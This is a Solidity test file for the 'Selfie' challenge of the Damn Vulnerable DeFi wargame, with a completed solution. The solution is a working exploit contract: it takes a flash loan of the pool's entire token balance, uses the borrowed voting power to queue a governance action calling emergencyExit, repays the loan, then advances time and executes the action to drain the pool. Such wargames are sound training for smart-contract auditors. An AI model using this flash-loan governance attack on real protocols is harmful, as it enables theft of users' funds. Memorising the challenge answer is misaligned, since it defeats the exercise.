// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "forge-std/Vm.sol";

contract Attack is IERC3156FlashBorrower, Test {
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    DamnValuableVotes votingToken;
    SimpleGovernance governance;
    SelfiePool pool;
    address recovery;
    uint256 actionCounter;

    constructor(address _votingToken, address _governance, address _recovery, address _pool) {
        votingToken = DamnValuableVotes(_votingToken);
        governance = SimpleGovernance(_governance);
        pool = SelfiePool(_pool);
        recovery = _recovery;
    }

    function attack() external {
        uint256 poolBalance = votingToken.balanceOf(address(pool));
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(votingToken), poolBalance, bytes(""));
        vm.warp(block.timestamp + 2 days);
        governance.executeAction(actionCounter);
    }

    function onFlashLoan(address sender, address token, uint256 amount, uint256 value, bytes calldata data)
        external
        returns (bytes32)
    {
        votingToken.delegate(address(this));
        actionCounter = governance.queueAction(address(pool), 0, abi.encodeCall(pool.emergencyExit, (recovery)));
        votingToken.approve(msg.sender, amount);
        return CALLBACK_SUCCESS;
    }
}

contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        Attack att = new Attack(address(token), address(governance), recovery, address(pool));
        att.attack();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}
